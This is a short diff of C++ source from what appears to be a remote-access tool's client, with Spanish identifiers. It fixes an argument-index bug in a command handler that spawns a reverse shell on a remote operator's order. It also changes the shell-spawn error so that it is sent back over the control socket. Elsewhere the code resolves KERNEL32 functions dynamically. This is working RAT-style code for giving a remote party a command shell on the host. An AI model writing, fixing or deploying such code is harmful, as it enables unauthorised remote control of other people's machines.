@@ -10,7 +10,7 @@
 #include "mod_escaner.hpp"
 #include "misc.hpp"
 
-#include "config.hpp"
+//#include "config.hpp"
 
 template<typename OBJ>
 void DeleteObj(OBJ*& _obj) {
@@ -828,7 +828,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         strIn = strSplit(std::string(paquete.cBuffer.data()), CMD_DEL, 2);
 
         this->reverseSHELL = new ReverseShell();
-        this->reverseSHELL->SpawnShell(strIn[0].c_str(), strIn.size() == 2 ? strIn[2].c_str() : NULL);
+        this->reverseSHELL->SpawnShell(strIn[0].c_str(), strIn.size() == 2 ? strIn[1].c_str() : NULL);
         return;
     }
 
@@ -1861,7 +1861,8 @@ bool ReverseShell::SpawnShell(const char* pstrComando, const char* cPath) {
             if (cCliente->mod_dynamic->KERNEL32.pGetLastError) {
                 err = cCliente->mod_dynamic->KERNEL32.pGetLastError();
             }
-            cCliente->m_RemoteLog("[SHELL] CreateProcess error: " + std::to_string(err));
+            std::string strError = "No se pudo spawnear la shell: " + std::to_string(err);
+            cCliente->cChunkSend(cCliente->sckSocket, strError.c_str(), strError.size(), 0, true, nullptr, EnumComandos::Reverse_Shell_Salida);
             __DBG_("No se pudo spawnear la shell");
             return false;
         }
